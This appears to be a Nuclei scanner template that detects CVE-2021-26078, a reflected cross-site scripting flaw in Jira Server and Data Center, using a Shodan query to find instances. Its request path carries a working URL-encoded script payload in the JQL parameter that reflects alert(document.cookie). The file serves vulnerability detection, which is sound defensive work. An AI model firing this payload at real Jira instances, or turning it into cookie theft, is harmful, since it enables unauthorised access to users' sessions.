id: CVE-2021-26078

info:
  name: Atlassian Jira Server and Data Center XSS Vulnerability
  author: ProjectDiscoveryAI
  severity: medium
  description: The number range searcher component in Jira Server and Jira Data Center before version 8.5.14, from version 8.6.0 before version 8.13.6, and from version 8.14.0 before version 8.16.1 allows remote attackers to inject arbitrary HTML or JavaScript via a cross site scripting (XSS) vulnerability.
  impact: |
    Successful exploitation could lead to unauthorized access or data theft.
  remediation: |
    Apply the necessary security patches provided by Atlassian to mitigate the vulnerability.
  reference:
    - https://jira.atlassian.com/browse/JRASERVER-72392
    - http://packetstormsecurity.com/files/163289/Atlassian-Jira-Server-Data-Center-8.16.0-Cross-Site-Scripting.html
    - https://github.com/ARPSyndicate/cvemon
    - https://github.com/n0-traces/cve_monitor
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2021-26078
    cwe-id: CWE-79
    epss-score: 0.00407
    epss-percentile: 0.7454
    cpe: cpe:2.3:a:atlassian:data_center:*:*:*:*:*:*:*:*
  metadata:
    vendor: atlassian
    product: data_center
    shodan-query: http.component:"Atlassian Jira"
  tags: packetstorm

http:
  - method: GET
    path:
      - "{{BaseURL}}/secure/IssueNavigator.jspa?reset=true&jql=issuetype%20%3D%20Epic%20AND%20%22Story%20Points%22%20%3C%3D%20%22%5C%22%3E%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E%22%20AND%20%22Story%20Points%22%20%3E%3D%20%221%22"

    matchers:
      - type: word
        words:
          - "<script>alert(document.cookie)</script>"
        part: body
